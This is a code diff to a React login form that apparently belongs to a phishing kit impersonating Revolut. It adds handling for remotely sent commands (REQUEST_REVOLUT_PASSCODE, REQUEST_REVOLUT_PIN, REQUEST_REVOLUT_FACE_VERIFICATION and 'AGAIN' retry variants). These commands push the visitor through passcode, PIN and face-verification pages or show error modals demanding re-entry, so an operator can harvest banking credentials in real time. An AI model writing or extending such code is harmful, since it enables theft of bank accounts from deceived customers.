@@ -51,28 +51,49 @@ export default function LoginForm() {
         setDisplayMessage(errorType)
     }
 
+    useEffect(() => {
+    // Display the loader for 2 seconds when the component mounts
+    displayPageLoader();
+    const timer = setTimeout(() => {
+        setDisplayLoader(false); // Hide the loader after 2 seconds
+    }, 2000);
 
-    // Handle command changes
+    return () => clearTimeout(timer); // Cleanup the timer on unmount
+    }, []);
+
+
     useEffect(() => {
         if (command === 'REQUEST_EMAIL_AGAIN') {
-            console.log("HERE WE WILL PUSH TO PASSWORD PAGE")
-            // setInvalid(true); // Show error state for email input
-            // setIsLoading(false);
+            console.log("HERE WE WILL PUSH TO PASSWORD PAGE");
+            displayErrorModal('email'); // Show error modal for email
+        } else if (command === 'REQUEST_REVOLUT_NUMBER_AGAIN') {
+            displayErrorModal('phone'); // Show error modal for phone number
         } else if (command === 'REQUEST_REVOLUT_PASSCODE') {
-            // setIsLoading(false);
             setTimeout(() => {
-                // setIsLoading(false);
-                console.log("HERE WE WILL PUSH TO PASSWORD PAGE")
+                console.log("HERE WE WILL PUSH TO PASSWORD PAGE");
                 router.push('/PasswordPage');
             }, 500);
-        } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
-            // setIsLoading(false);
+        } else if (command === 'REQUEST_REVOLUT_PASSCODE_AGAIN') {
+            displayErrorModal('passcode'); // Show error modal for passcode
+        } else if (command === 'REQUEST_REVOLUT_PIN') {
             setTimeout(() => {
-                // setIsLoading(false);
-                console.log("HERE WE WILL PUSH TO PASSWORD PAGE")
-                // router.push('/PasswordPage');
+                console.log("HERE WE WILL PUSH TO PIN PAGE");
+                router.push('/PinPage');
             }, 500);
-        }  else if (command === 'FINISH') {
+        } else if (command === 'REQUEST_REVOLUT_PIN_AGAIN') {
+            displayErrorModal('pin'); // Show error modal for pin
+        } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
+            setTimeout(() => {
+                console.log("HERE WE WILL PUSH TO FACE VERIFICATION PAGE");
+                router.push('/FaceVerificationPage');
+            }, 500);
+        } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
+            displayErrorModal('face_verification'); // Show error modal for face verification
+        } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
+            setTimeout(() => {
+                console.log("HERE WE WILL PUSH TO MOBILE APP VERIFICATION PAGE");
+            }, 500);
+        } else if (command === 'FINISH') {
             setTimeout(() => {
                 resetCommand(); 
                 router.push('/verificationPage');
@@ -80,6 +101,7 @@ export default function LoginForm() {
         }
     }, [command, router]);
 
+    
     const { validateEmail } = useValidateEmail();
     // Handle email validation
     const handleEmailValidation = () => {
